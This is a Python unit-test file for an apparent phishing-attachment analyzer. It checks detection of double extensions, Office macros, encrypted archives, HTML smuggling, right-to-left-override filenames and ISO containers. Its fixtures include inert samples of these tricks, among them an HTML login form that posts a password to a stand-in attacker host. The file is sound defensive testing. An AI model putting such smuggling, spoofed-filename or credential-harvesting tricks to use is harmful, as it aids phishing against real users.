import hashlib
import io
import unittest
import zipfile

from phishkit.attachments import analyze_attachments, detect_type
from phishkit.models import Severity
from phishkit.parser import parse_email
from tests.helpers import make_eml

MZ = b"MZ\x90\x00" + b"\x00" * 60 + b"This program cannot be run in DOS mode"


def zip_bytes(members, encrypted=False):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in members.items():
            zf.writestr(name, data)
    data = bytearray(buf.getvalue())
    if encrypted:
        # Set the "encrypted" general-purpose bit in every local and central header,
        # which is how a password-protected archive is marked.
        for signature, offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
            pos = data.find(signature)
            while pos != -1:
                data[pos + offset] |= 0x1
                pos = data.find(signature, pos + 4)
    return bytes(data)


def run(filename, payload, maintype="application", subtype="octet-stream"):
    raw = make_eml(attachments=[(filename, payload, maintype, subtype)])
    return analyze_attachments(parse_email(raw))


def titles(findings):
    return {f.title: f for f in findings}


class DetectTypeTests(unittest.TestCase):
    def test_signatures(self):
        self.assertEqual(detect_type(MZ), "pe")
        self.assertEqual(detect_type(b"%PDF-1.7\n"), "pdf")
        self.assertEqual(detect_type(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 10), "ole2")
        self.assertEqual(detect_type(zip_bytes({"a.txt": "x"})), "zip")
        self.assertEqual(detect_type(zip_bytes({"[Content_Types].xml": "x", "word/document.xml": "x"})), "ooxml")
        self.assertEqual(detect_type(b"<!DOCTYPE html><html>"), "html")
        self.assertEqual(detect_type(b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 8), "lnk")
        self.assertEqual(detect_type(b"\x00" * 0x8001 + b"CD001"), "iso")


class AttachmentTests(unittest.TestCase):
    def test_hashes_and_size(self):
        payload = b"%PDF-1.7 harmless"
        entries, findings = run("report.pdf", payload, "application", "pdf")
        e = entries[0]
        self.assertEqual(e["md5"], hashlib.md5(payload).hexdigest())
        self.assertEqual(e["sha1"], hashlib.sha1(payload).hexdigest())
        self.assertEqual(e["sha256"], hashlib.sha256(payload).hexdigest())
        self.assertEqual(e["size"], len(payload))
        self.assertEqual(e["detected_type"], "pdf")
        self.assertEqual(e["flags"], [])
        self.assertEqual(findings, [])

    def test_double_extension_executable(self):
        entries, findings = run("invoice.pdf.exe", MZ)
        t = titles(findings)
        self.assertEqual(t["Double file extension"].severity, Severity.CRITICAL)
        self.assertIn("risky_extension", entries[0]["flags"])

    def test_type_mismatch(self):
        entries, findings = run("invoice.pdf", MZ, "application", "pdf")
        self.assertEqual(titles(findings)["File content does not match its extension"].severity, Severity.HIGH)
        self.assertEqual(entries[0]["detected_type"], "pe")

    def test_ooxml_with_macros(self):
        doc = zip_bytes({"[Content_Types].xml": "x", "word/document.xml": "x", "word/vbaProject.bin": "dummy"})
        _, findings = run("Invoice_4471.docm", doc)
        self.assertEqual(titles(findings)["Office document contains macros"].severity, Severity.HIGH)

    def test_ole2_with_macros(self):
        doc = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 100 + b"_VBA_PROJECT" + b"\x00" * 10
        _, findings = run("old.doc", doc, "application", "msword")
        self.assertIn("Office document contains macros", titles(findings))

    def test_encrypted_zip(self):
        _, findings = run("files.zip", zip_bytes({"invoice.pdf": "x"}, encrypted=True))
        self.assertEqual(titles(findings)["Password-protected archive"].severity, Severity.MEDIUM)

    def test_zip_containing_executable(self):
        entries, findings = run("docs.zip", zip_bytes({"scan.pdf.js": "WScript.Shell"}))
        self.assertIn("Archive contains risky files", titles(findings))
        self.assertEqual(entries[0]["archive_members"], ["scan.pdf.js"])

    def test_html_smuggling(self):
        html = b"<html><script>var b=atob('TVqQ');var blob=new Blob([b]);a.download='x.iso';</script></html>"
        _, findings = run("Remittance.html", html, "text", "html")
        self.assertEqual(titles(findings)["HTML smuggling attachment"].severity, Severity.HIGH)

    def test_html_credential_form(self):
        html = b"<html><form action='https://evil.test'><input type='password' name='p'></form></html>"
        _, findings = run("login.htm", html, "text", "html")
        self.assertIn("HTML attachment contains a login form", titles(findings))

    def test_rtlo_filename(self):
        entries, findings = run("invoice‮fdp.exe", MZ)
        self.assertEqual(titles(findings)["Filename uses right-to-left override"].severity, Severity.CRITICAL)
        self.assertIn("rtlo", entries[0]["flags"])

    def test_iso_container(self):
        _, findings = run("delivery.iso", b"\x00" * 0x8001 + b"CD001")
        self.assertIn("Risky attachment type", titles(findings))


if __name__ == "__main__":
    unittest.main()
